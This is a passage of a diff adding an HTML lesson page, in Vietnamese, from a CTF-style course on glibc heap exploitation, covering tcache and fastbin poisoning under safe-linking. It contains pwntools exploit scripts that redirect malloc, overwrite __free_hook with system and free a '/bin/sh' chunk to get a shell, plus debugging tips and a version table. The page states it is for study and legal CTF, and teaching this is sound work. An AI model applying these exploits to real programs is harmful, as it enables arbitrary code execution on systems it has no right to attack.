+<span class="c"># 1) leak heap: free 1 chunk tcache, UAF-read fd (next=NULL) = chunk&gt;&gt;12</span>
+alloc(<span class="d">0</span>,<span class="d">0x40</span>); free(<span class="d">0</span>)
+heap_lo = u64(show(<span class="d">0</span>)[:<span class="d">8</span>].ljust(<span class="d">8</span>,b<span class="s">"\x00"</span>))
+chunk0  = heap_lo &lt;&lt; <span class="d">12</span>                  <span class="c"># địa chỉ chunk0 (header)</span>
+log.success(<span class="s">f"chunk0 = {hex(chunk0)}"</span>)
+
+<span class="c"># 2) leak libc (unsorted) → libc.address  (offset 2.35 khác 2.31, tính bằng gdb)</span>
+<span class="c"># ... libc.address = leak - OFF_2_35_unsorted ...</span>
+
+<span class="c"># 3) poisoning có safe-link: fd = enc(chunk0, target)</span>
+target = <span class="d">0x404100</span>                         <span class="c"># đích căn 0x10 (vd bss struct)</span>
+alloc(<span class="d">0</span>,<span class="d">0x40</span>); free(<span class="d">0</span>)
+edit(<span class="d">0</span>, p64(enc(chunk0, target)))        <span class="c"># mã hóa!</span>
+alloc(<span class="d">1</span>,<span class="d">0x40</span>); alloc(<span class="d">2</span>,<span class="d">0x40</span>)          <span class="c"># chunk2 == target</span>
+edit(<span class="d">2</span>, p64(libc.sym.system))
+p.interactive()</code></pre>
+<div class="note warn"><span class="tag">Thành thật 2.35</span>Vì 2.35 bỏ <code>__free_hook</code>, chuỗi RCE thật dùng <a href="fsop.html">stdout FSOP</a> làm đích (một địa chỉ căn 0x10 trong libc). Bản B minh họa <b>cơ chế poisoning có safe-link + encode + alignment</b>; đích cuối là bài FSOP.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-c" hidden>
+<pre><code><span class="c"># BẢN C — pwnld: protect_ptr tự xử lý safe-link theo version.</span>
+<span class="k">from</span> pwnld <span class="k">import</span> *
+context.binary = exe = ELF(<span class="s">"./chall"</span>, checksec=<span class="k">False</span>); libc = get_libc(<span class="s">"./libc.so.6"</span>)
+p = start(); GDB(); m = Menu(prompt=b<span class="s">"&gt;"</span>)
+
+<span class="c"># leak libc + heap → LIBC.address, HEAP_BASE ; chunk0 = HEAP_BASE + off0</span>
+m.alloc(<span class="d">0</span>,<span class="d">0x40</span>); m.free(<span class="d">0</span>)
+m.edit(<span class="d">0</span>, p64(protect_ptr(chunk0, LIBC.sym.__free_hook)))  <span class="c"># =target nếu &lt;2.32</span>
+m.alloc(<span class="d">1</span>,<span class="d">0x40</span>); m.alloc(<span class="d">2</span>,<span class="d">0x40</span>); m.edit(<span class="d">2</span>, p64(LIBC.sym.system))
+m.alloc(<span class="d">3</span>,<span class="d">0x20</span>,b<span class="s">"/bin/sh\x00"</span>); m.free(<span class="d">3</span>); ia()</code></pre>
+<div class="note"><span class="tag">pwnld</span><code>protect_ptr(pos,ptr)</code> mã hóa safe-linking; nếu libc &lt;2.32 pwnld trả thẳng target. <code>Menu</code> gói menu; vẫn phải tự lấy <code>chunk0</code>.</div>
+  </div>
+
+  <h3>Checklist khi malloc không trả về đích</h3>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>"unaligned tcache chunk detected"</h4><p>target không căn 0x10 (≥2.32). Chọn đích căn 16, hoặc bù offset khi edit.</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>malloc trả về rác (≥2.32)</h4><p>Quên encode fd. Dùng <code>enc(pos,target)</code>. <code>pos</code> = &amp;chunk (header), KHÔNG phải &amp;data.</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>fastbin: "malloc(): memory corruption (fast)"</h4><p>Size tại <code>target−0x8</code> không khớp index bin. Dựng fake size hoặc chuyển tcache.</p></div></div>
+ </div>
+</section>
+
+<!-- 08 Công cụ -->
+<section class="block" id="s8">
+ <div class="wrap">
+  <div class="secnum">08 / CÔNG CỤ</div>
+  <h2>Hộp đồ nghề</h2>
+  <div class="grid">
+    <div class="card"><div class="term">pwndbg tcache/bins</div><h4>Theo dõi bin</h4><p>Thấy fd bị đổi, head trỏ đâu, count.</p></div>
+    <div class="card"><div class="term">protect_ptr/reveal_ptr</div><h4>Safe-link</h4><p>pwnlib/pwnld helper mã hóa/giải mã fd.</p></div>
+    <div class="card"><div class="term">vis_heap_chunks</div><h4>Lấy chunk0 addr</h4><p>Địa chỉ chunk cho công thức enc.</p></div>
+    <div class="card"><div class="term">how2heap</div><h4>POC</h4><p><code>tcache_poisoning</code>, <code>fastbin_dup_into_stack</code>.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 09 Gỡ lỗi -->
+<section class="block" id="s9">
+ <div class="wrap">
+  <div class="secnum">09 / GỠ LỖI</div>
+  <h2>Khi poisoning không ăn</h2>
+  <div class="grid">
+    <div class="card"><h4>unaligned tcache chunk</h4><p>target không căn 0x10 (≥2.32). Chọn đích căn 16 hoặc bù offset.</p></div>
+    <div class="card"><h4>Quên safe-link</h4><p>≥2.32 mà ghi fd thô → malloc trả rác. Dùng enc(pos,target).</p></div>
+    <div class="card"><h4>pos sai</h4><p>pos phải là địa chỉ CHUNK (header), không phải con trỏ data (data = chunk+0x10).</p></div>
+    <div class="card"><h4>fastbin: size mismatch</h4><p>Target không có fake size khớp bin → abort. Dùng tcache hoặc dựng fake size.</p></div>
+    <div class="card"><h4>tcache count=0</h4><p>Một số check đòi count&gt;0 để lấy từ tcache. Free thêm hoặc sửa counts[idx].</p></div>
+    <div class="card"><h4>__free_hook mất</h4><p>glibc ≥2.34. Đổi đích FSOP/exit handler (dùng poisoning để ghi vào đó).</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 Biến thể -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / BIẾN THỂ GLIBC & NHẬN DIỆN</div>
+  <h2>Chọn đường theo version</h2>
+  <div class="tablewrap"><table>
+    <thead><tr><th>glibc</th><th>fd</th><th>align check</th><th>Đích RCE</th><th>Cần leak</th></tr></thead>
+    <tbody>
+      <tr><td>2.27–2.31</td><td>thô</td><td class="no">không</td><td>__free_hook=system</td><td>libc</td></tr>
+      <tr><td>2.32–2.33</td><td class="yes">safe-link</td><td class="yes">có</td><td>__free_hook=system</td><td>libc + heap</td></tr>
+      <tr><td>≥2.34</td><td class="yes">safe-link</td><td class="yes">có</td><td><a href="fsop.html">FSOP</a>/<a href="exit_handlers.html">exit</a></td><td>libc + heap</td></tr>
+    </tbody>
+  </table></div>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Tình huống</th><th></th><th>Ghi chú</th></tr></thead>
+    <tbody>
+      <tr><td>UAF-edit/double-free, chunk ≤0x410</td><td class="yes">✅</td><td>tcache poisoning (ưu tiên)</td></tr>
+      <tr><td>Chỉ fastbin (tcache đầy)</td><td class="maybe">⚠️</td><td>Lo fake size tại target</td></tr>
+      <tr><td>≥2.32 chưa leak heap</td><td class="no">❌</td><td>Phải leak heap trước</td></tr>
+      <tr><td>Chunk &gt;0x410</td><td class="maybe">⚠️</td><td>→ <a href="unsorted_largebin.html">unsorted/largebin</a></td></tr>
+    </tbody>
+  </table></div>
+  <div class="note"><span class="tag">x86 (32-bit)</span>safe-linking cũng áp dụng, nhưng con trỏ 4 byte (<code>pos&gt;&gt;12</code> vẫn vậy). <code>p32</code>/<code>u32</code>. Offset libc 32-bit khác hẳn.</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LUYỆN TẬP</div>
+  <h2>Bài tập tăng dần</h2>
+  <div class="ex"><div class="level">⭐⭐ · Poisoning cơ bản (2.31)</div><p>UAF-edit fd tcache về một biến global, malloc 2 lần, ghi vào biến đó. Xác nhận bằng gdb.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐ · Safe-linking (2.35)</div><p>Leak heap, dùng enc(pos,target) để poisoning về một con trỏ căn 0x10. Chú ý alignment.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐⭐ · Fastbin vào stack</div><p>fastbin_dup_into_stack: fake size trên stack, ép malloc trả về stack để ghi return address.</p></div>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / THUẬT NGỮ & ĐỌC THÊM</div>
+  <h2>Tra cứu nhanh</h2>
+  <div class="grid">
+    <div class="card"><div class="term">poisoning</div><p>Ghi đè fd để lái malloc về đích.</p></div>
+    <div class="card"><div class="term">arbitrary allocation</div><p>Ép malloc trả chunk tại địa chỉ tùy ý.</p></div>
+    <div class="card"><div class="term">safe-linking</div><p>fd = (pos>>12)^next (≥2.32).</p></div>
+    <div class="card"><div class="term">PROTECT_PTR / REVEAL_PTR</div><p>Macro mã hóa/giải mã fd.</p></div>
+    <div class="card"><div class="term">pos</div><p>Địa chỉ chunk (header) giữ fd.</p></div>
+    <div class="card"><div class="term">alignment check</div><p>tcache ≥2.32: target phải căn 0x10.</p></div>
+    <div class="card"><div class="term">fake size</div><p>Dựng size hợp lệ tại target cho fastbin.</p></div>
+    <div class="card"><div class="term">tcache key</div><p>Trường chống double-free; xóa để né.</p></div>
+  </div>
+  <h3>Đọc thêm</h3>
+  <ul>
+    <li>Trước: <a href="heap_bugs.html">heap_bugs</a>. Tiếp: <a href="unsorted_largebin.html">unsorted_largebin</a> · <a href="hook_overwrite.html">hook_overwrite</a> · <a href="fsop.html">fsop</a>.</li>
+    <li>how2heap: <code>tcache_poisoning</code>, <code>fastbin_dup</code>, <code>fastbin_dup_into_stack</code> · safe-linking writeup (glibc 2.32).</li>
+  </ul>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p><strong>Phase 4 · Bài 20.</strong> Poisoning = ghi fd của chunk trong tcache/fastbin → malloc kế trả về địa chỉ tùy ý. ≥2.32: fd = (pos&gt;&gt;12)^target, cần leak heap + căn 16. Tiếp theo: unsorted & largebin.</p>
+    <p style="margin-top:6px;opacity:.7">Chỉ dùng cho học tập và CTF hợp pháp.</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("tcf-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("tcf-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+
+  function hx(b){if(b<0n)b=0n;return "0x"+b.toString(16);}
+  function pv(s){s=(s||"").trim();try{if(/^0x[0-9a-f]+$/i.test(s))return BigInt(s);if(/^\d+$/.test(s))return BigInt(s);}catch(e){}return null;}
+  var sP=document.getElementById("sP"),sT=document.getElementById("sT"),sOld=document.getElementById("sOld"),sOut=document.getElementById("sOut");
+  function calc(){
+    var pos=pv(sP.value),t=pv(sT.value);
+    if(pos===null||t===null){sOut.innerHTML='<div class="ro">nhập số hợp lệ</div>';return;}
+    var fd = sOld.checked ? t : ((pos>>12n) ^ t);
+    var align = (t & 0xfn)===0n;
+    sOut.innerHTML =
+      '<div class="ro"><span>pos &gt;&gt; 12</span><b>'+hx(pos>>12n)+'</b></div>'+
+      '<div class="ro res"><span>fd cần ghi</span><b>'+hx(fd)+'</b></div>'+
+      '<div class="ro" style="'+(align?'':'border-color:var(--danger)')+'"><span>target căn 0x10?</span><b style="color:'+(align?'var(--ok)':'var(--danger)')+'">'+(align?'OK':'LỆCH → abort (≥2.32)')+'</b></div>'+
+      '<div class="ro" style="font-size:12px"><span>chế độ</span><b>'+(sOld.checked?'glibc <2.32 (fd thô)':'safe-linking')+'</b></div>';
+  }
+  [sP,sT].forEach(function(e){e.addEventListener("input",calc);});
+  sOld.addEventListener("change",function(){sP.disabled=sOld.checked;calc();});
+  calc();
+
+  var tabs=[].slice.call(document.querySelectorAll("#tabs .tab"));
+  var panels={a:document.getElementById("panel-a"),b:document.getElementById("panel-b"),c:document.getElementById("panel-c")};
+  tabs.forEach(function(t){t.addEventListener("click",function(){
+    tabs.forEach(function(x){x.classList.remove("active");});t.classList.add("active");
+    Object.keys(panels).forEach(function(k){panels[k].hidden=(k!==t.getAttribute("data-t"));});
+  });});
+})();
+</script>
